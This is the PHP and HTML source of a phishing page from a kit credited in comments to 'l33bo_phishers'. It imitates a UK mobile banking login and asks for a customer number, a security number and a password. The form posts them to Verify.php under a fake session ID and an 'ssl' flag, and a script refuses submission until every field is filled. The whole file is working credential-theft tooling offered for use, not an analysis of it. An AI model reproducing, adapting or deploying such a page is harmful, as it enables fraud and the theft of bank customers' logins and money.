<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Login</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo_phishers_mobile_css.css" rel="stylesheet" type="text/css">
<script>
function Check() {
    var x = document.forms["login"]["user"].value;
    var y = document.forms["login"]["pass"].value;
    var z = document.forms["login"]["memo"].value;
    if (x == null || x == "") {
		document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
    if (y == null || y == "") {
		document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
    if (z == null || z == "") {
		document.getElementById("ErrorBox").style.display = "block";
        return false;
    }
}
</script>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner" style="background-color:#002277">
<p id="logo"><img src="assets/img/logo.png"></p>

<p class="cookiePolicy"><a href="#" id="lnkePrivacy" style="color:#ffffff">Cookie policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Welcome</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="ErrorBox" style="display:none;">
<div class="msgTL">
<div class="msgTR">
<div class="msgBR">
<div class="msgBL">
<span><br><img style="margin-left:5px" src="assets/img/loginerror.png"></span>
</div>
</div>
</div>
</div>
</div>
<div class="loginFields">
<form id="login" name="login" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" onsubmit="return Check();">
<div class="formField">
<label for="user">Customer Number or Username</label>
<input autocomplete="off" class="wide" id="user" class="required" maxlength="30" name="user" type="text">
</div>
<div class="formField">
<label for="memo">Security number</label>
<input autocomplete="off" class="wide" id="memo" class="required" maxlength="30" name="memo" type="text">
</div>
<div class="formField">
<label for="pass">Password</label>
<input autocomplete="off" class="wide" id="pass" class="required" maxlength="20" name="pass" type="password"></div>
<div class="actionsLogin">
<div class="divider">
<hr></div>
<input class="submitAction" id="go" name="go" type="submit" value="Continue" style="background:#002277;">
</div>
</form>
</div>
</div>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote">
<a href="#">Forgotten your Customer Number or Username?
</a>
<br><br>
</p>
</div>
</div>
</div>
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Contact us</a></p>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote"><a href="#">Mobile Banking</a></p>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img src="assets/img/003.jpg"></a></p>
</div>
</div>
<div class="clearer"></div>
<div>
<div class="footerLinksLogin"><a href="#" >Security</a>
<a class="footerLinksLast" href="#">Legal</a></div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
?>